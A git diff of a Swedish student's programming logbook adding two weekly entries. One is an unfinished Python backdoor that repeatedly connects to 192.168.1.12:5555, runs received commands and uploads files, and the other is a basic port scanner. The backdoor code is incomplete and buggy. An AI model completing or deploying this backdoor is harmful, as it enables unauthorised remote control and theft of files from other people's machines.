@@ -1,9 +1,88 @@
 # Programmering
 Loggbok 
 =========================
-OBS
---
-Jag ska redigera vecka 5 och vecka 8 och kanske små andra saker från olika veckor, eller kanske lägga till massa andra saker som jag gjorde fast jag orkar inte skriva om. 
+Vecka 12-13
+----------------
+Gjorde: (absolut inte färdig kod än)
+~~~
+
+import socket
+import time
+import subprocess
+import json
+import os
+
+def reliable_send(data):
+        jsondata = json.dumps(data)
+        s.send(jsondata.encode())
+
+def reliable_recv():
+        while True:
+                try:
+                        data = data + s.recv(1024).decode().rstrip()
+                        return json.loads(data)
+                except ValueError:
+                        continue
+
+def connection():
+	while True:
+		time.sleep(20)
+		try:
+			s.connect(('192.168.1.12',5555))
+			shell()
+			s.close()
+			break
+		except:
+			connection()
+
+def upload_file(file_name):
+	f = open(file_name, 'rb')
+	s.send(f.read())
+
+
+def download_file(file_name):
+        f = open(file_name, 'wb')
+
+def shell():
+	while True:
+		command = reliable_recv()
+		if command == 'quit':
+			break
+		elif command == 'clear':
+			pass
+		elif command[:3] == 'cd ':
+			os.chdir(command[3:])
+		elif command[:8] == 'download':
+			download_file(command[9:])
+		elif command[:6] == 'upload':
+			upload_file(command[7:])
+~~~
+
+Jag började lära mig hur man skapar en enkel bakdörr i Python för att kommunicera med fjärrdatorer över nätverket. Genom att använda sockets kan jag skicka och ta emot data, vilket gör att jag kan utföra olika kommandon på den anslutna datorn.
+
+Vecka 11
+----------------
+Gjorde: (Inte färdig kod än)
+~~~
+import socket
+
+def scan(target, ports):
+    for port in range (1,ports):
+        scan_port(target,port)
+def scan_port(ipaddress, port):
+    try:
+        sock = socket.socket()
+        sock.connect((ipaddress, port))
+        print("The Port is Open " + str(port))
+        sock.close()
+    except:
+        print("The Port is Closed" + str(port))
+
+target = input("Enter Target To Scan: ")
+ports = input("Enter How Many Ports You Want To Scan: ")
+~~~
+
+Jag har börjat lära mig hur man skapar en portscanner i Python. Genom att använda socket-modulen kan jag skanna önskade IP-adresser och portar för att identifiera öppna portar och eventuella sårbarheter i nätverket.
 
 Vecka 10
 ----------------
